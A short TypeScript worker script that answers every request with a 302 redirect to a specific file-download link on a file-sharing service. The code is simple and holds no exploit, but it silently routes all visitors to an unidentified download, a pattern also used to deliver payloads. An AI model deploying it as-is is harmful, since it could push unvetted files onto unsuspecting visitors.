// redirect.ts

// Define the redirect URL
const redirectUrl = "https://2111.filemail.com/api/file/get?filekey=s3kVTpRsSiB3FNs3XmWn5mngL0GLiu5RgYl9SH7mFq2j5v6PvuiZcKwdBuHLwpZrtxPU_03OaSfygLTpGkpe&pk_vid=0084db10739001c61759957311fdc291"; // Replace with the URL you want to redirect to

// Handle the request
addEventListener("fetch", (event) => {
  event.respondWith(
    new Response(null, {
      status: 302, // HTTP status for redirection
      headers: {
        "Location": redirectUrl, // The URL to redirect to
      },
    })
  );
});
